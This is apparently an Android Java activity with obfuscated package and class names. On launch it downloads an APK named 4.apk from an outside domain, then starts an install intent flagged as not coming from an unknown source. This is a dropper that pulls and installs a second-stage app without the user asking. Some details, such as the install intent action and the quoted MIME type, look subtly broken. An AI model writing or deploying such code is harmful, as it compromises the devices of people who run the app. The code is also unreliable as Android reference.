package b.g.g;

import android.app.Activity;
import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;

import androidx.core.content.FileProvider; // uses the most (T_T)

import java.io.File;

public class p extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String destination =
                this.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS).toString() + "/4";
        Uri uri = Uri.parse("file://" + destination);
        DownloadManager downloadManager = (DownloadManager) this.getSystemService(Context.DOWNLOAD_SERVICE);
        Uri downloadUri = Uri.parse("http://h0wdy.partners/media/4.apk");
        DownloadManager.Request request = new DownloadManager.Request(downloadUri);
        request.setDestinationUri(uri);
        BroadcastReceiver onComplete = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    Uri contentUri = FileProvider.getUriForFile(
                            context,
                            "b.g.g.provider",
                            new File(destination)
                    );
                    Intent install = new Intent(Intent.ACTION_GET_CONTENT);
                    install.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                    install.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    install.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true);
                    install.setData(contentUri);
                    context.startActivity(install);
                    context.unregisterReceiver(this);
                } else {
                    Intent install = new Intent(Intent.ACTION_VIEW);
                    install.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    install.setDataAndType(
                            uri,
                            "\"application/vnd.android.package-archive\""
                    );
                    context.startActivity(install);
                    context.unregisterReceiver(this);
                }
            }
        };
        this.registerReceiver(onComplete, new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));
        downloadManager.enqueue(request);
    }
}